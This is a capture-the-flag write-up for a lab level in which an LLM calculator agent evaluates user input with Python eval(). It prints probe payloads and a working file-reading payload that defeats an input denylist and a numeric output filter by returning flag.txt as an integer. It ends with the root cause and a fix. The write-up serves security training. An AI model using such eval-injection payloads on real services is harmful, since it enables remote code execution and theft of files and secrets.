---
title: "Arkx — Bad Robot"
platform: "Arkx"
track: "Advanced"
level: "Level 5"
vuln: "Python eval() code injection via an agent tool"
severity: "Critical"
flag: "flag-d8de8d"
owasp: ["LLM05 Improper Output Handling", "LLM06 Excessive Agency"]
atlas: ["AML.T0053 LLM Plugin Compromise", "AML.T0051 LLM Prompt Injection"]
image: "/arkx/l5-bad-robot.jpg"
order: 1
date: 2026-11-13
tags: ["ai", "llm", "rce", "code-injection", "eval"]
summary: "A calculator agent that runs your input through eval() — bypassing an input denylist and a numeric-only output filter by encoding a file as one big integer."
draft: false
---

## Result

The *Bad Robot* agent is a "Math Calculation Service" — it takes an expression and evaluates it **server-side with Python `eval()`**. That is arbitrary code execution; the flag lives in `flag.txt`.

**Flag:** `flag-d8de8d`

## Exploit

**1 — Probe.** The obvious payload is caught:

```text
> __import__('os').environ
Result: ✗ Expression contains prohibited values
```

So there's an *input* denylist (blocks `os`, `import`, `__class__`, string literals, etc).

**2 — Find the second guard.** Plain concatenation gets past the denylist but hits a different wall:

```text
> 'hello'+'world'
Result: Error: Output format not supported.
```

The *output* must be numeric. Two independent filters: one on what you send, one on what comes back — neither constrains execution itself.

**3 — Bypass both.** Execute code whose result is a pure integer, encoding the file's bytes so it sails through the numeric filter:

```python
int.from_bytes(open('flag.txt','rb').read(), 'big')
```

```text
Result: 123822245949726000553474148
```

**4 — Decode** the integer back to bytes locally → `flag-d8de8d`.

## Root cause

User input reaches `eval()` directly. The guardrails are a substring **denylist on the input** and a **numeric-format check on the output**. Neither restricts what actually runs, so encoding the output as an integer evades the format check while still executing arbitrary code.

## Impact

Full RCE in the agent runtime — read any file, reach environment variables and secrets, pivot. Denylist-plus-output-filter is not a sandbox; the real fix is to never `eval()` untrusted input (use a real expression parser / AST allowlist).
